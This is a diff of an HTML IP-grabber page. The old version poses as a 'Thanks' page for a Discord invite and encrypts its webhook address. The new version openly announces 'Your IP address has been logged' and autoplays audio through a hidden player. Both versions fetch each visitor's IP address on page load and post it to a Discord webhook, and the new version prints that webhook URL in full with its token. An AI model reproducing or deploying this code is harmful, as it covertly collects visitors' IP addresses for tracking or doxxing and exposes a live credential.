@@ -3,92 +3,123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>discord.gg/drogen</title>
-    <meta property="og:title" content="Danke!">
-    <meta property="og:type" content="website">
-    <meta property="og:image" content="https://i.imgur.com/9BrtuAf.jpeg">
-    <meta property="og:description" content="discord.gg/drogen!">
-    <meta name="theme-color" content="#11b9d6">
-    <link rel="icon" type="image/png" href="https://i.imgur.com/9BrtuAf.jpeg">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1-crypto-js.js"></script>
+    <title>IP Logger</title>
     <style>
         body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-image: url('https://i.imgur.com/VC0ma9Y.jpeg');
             background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            color: white;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
         }
-
-        #ip-address {
-            font-size: 2em;
+        #ipDisplay {
+            font-size: 4em;
+            font-weight: bold;
+            margin-bottom: 10px;
         }
-
-        #title {
-            font-size: 2em;
-            margin-bottom: 20px;
+        .subtitle {
+            font-size: 1.8em;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <h1 id="title">Thanks</h1>
-    <p><span id="ip-address"></span></p>
+    <div id="player"></div>
+    <p id="ipDisplay">Loading your IP address...</p>
+    <p class="subtitle">Your IP address has been logged</p>
+
+    <!-- MP3 Player -->
+    <audio id="backgroundAudio" autoplay loop>
+        <source src="https://drive.google.com/uc?export=download&id=1M2VLi0nStplElruyQpWKSgaeTr1xiYvz" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
 
     <script>
-        // Verschlüsselter Webhook-URL
-        const encryptedWebhookURL = 'U2FsdGVkX1+J0BcJTLnGcYY/lwJww11aZ2ijsejxjsY=';  // Dein verschlüsselter Webhook
+        // Load YouTube API
+        var tag = document.createElement('script');
+        tag.src = "https://www.youtube.com/iframe_api";
+        var firstScriptTag = document.getElementsByTagName('script')[0];
+        firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
 
-        const secretKey = 'dein-geheimes-passwort';  // Das gleiche geheime Passwort, das du für die Verschlüsselung verwendet hast
-
-        // Funktion, um den Webhook-URL zu entschlüsseln
-        function decryptWebhook(encrypted) {
-            const bytes = CryptoJS.AES.decrypt(encrypted, secretKey);
-            const decryptedText = bytes.toString(CryptoJS.enc.Utf8);
-            console.log("Entschlüsselter Webhook-URL:", decryptedText); // Debugging
-            return decryptedText;
-        }
-
-        function sendToDiscord(ip) {
-            const webhookURL = decryptWebhook(encryptedWebhookURL);  // Entschlüsselter Webhook-URL
-            const data = {
-                content: `Sigma: ${ip}`
-            };
-
-            console.log("Sende an Webhook:", webhookURL); // Debugging
-            console.log("IP-Adresse:", ip); // Debugging
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
+        let player;
+        function onYouTubeIframeAPIReady() {
+            player = new YT.Player('player', {
+                height: '0',
+                width: '0',
+                videoId: 'YKflNeF5D_w', // Replace with your YouTube video ID
+                playerVars: {
+                    'autoplay': 1,
+                    'controls': 0,
+                    'loop': 1,
+                    'playlist': 'YKflNeF5D_w' // Required for looping
                 },
-                body: JSON.stringify(data),
-            })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Network response was not ok');
-                    }
-                    console.log("IP erfolgreich gesendet!"); // Debugging
-                })
-                .catch(error => {
-                    console.error('Fehler beim Senden an Discord:', error); // Debugging
+                events: {
+                    'onReady': onPlayerReady,
+                    'onStateChange': onPlayerStateChange
+                }
+            });
+        }
+
+        function onPlayerReady(event) {
+            // Set volume to 50% and play immediately
+            player.setVolume(50);
+            player.playVideo();
+        }
+
+        function onPlayerStateChange(event) {
+            // If video ends, replay it
+            if (event.data === YT.PlayerState.ENDED) {
+                player.playVideo();
+            }
+        }
+
+        // Set background image
+        document.body.style.backgroundImage = "url('https://cdn.discordapp.com/attachments/1151144288483283016/1331247474635046912/video0_4.gif?ex=6790ec53&is=678f9ad3&hm=3a89976dba559a1ec904403da9ae7cb8b11e1434f7cb45290010984b293bc1b7&')";
+
+        // Play background music on any user interaction
+        document.addEventListener('click', function() {
+            if (player && player.playVideo) {
+                player.playVideo();
+            }
+        });
+
+        async function logIP() {
+            try {
+                // Fetch the IP address
+                const response = await fetch("https://api.ipify.org?format=json");
+                const data = await response.json();
+                const ip = data.ip;
+
+                // Display the IP address
+                document.getElementById('ipDisplay').textContent = `${ip}`;
+
+                // Send IP to the webhook
+                const webhookURL = "https://discord.com/api/webhooks/1329145060230692935/-93HduLZfipXZnGgRBszzvfpOHYdAjWwcAElg9N_FdT4IB4pPbr05lUMQdtoSqTrqR4h"; // Replace with your actual webhook URL
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        ip: ip,
+                        timestamp: new Date().toISOString(),
+                    }),
                 });
+            } catch (error) {
+                console.error("Error logging IP:", error);
+                document.getElementById('ipDisplay').textContent = "Error loading IP address";
+            }
         }
 
-        function getIP(json) {
-            const ipAddress = json.ip;
-            document.getElementById("ip-address").textContent = ipAddress;
-            sendToDiscord(ipAddress);
-        }
-
-        // IP-Adresse abrufen und weiterverarbeiten
-        fetch('https://api.ipify.org/?format=json')
-            .then(response => response.json())
-            .then(data => getIP(data))
-            .catch(error => console.error('Fehler beim Abrufen der IP:', error)); // Debugging
+        // Log the IP as soon as the page loads
+        logIP();
     </script>
 </body>
 </html>
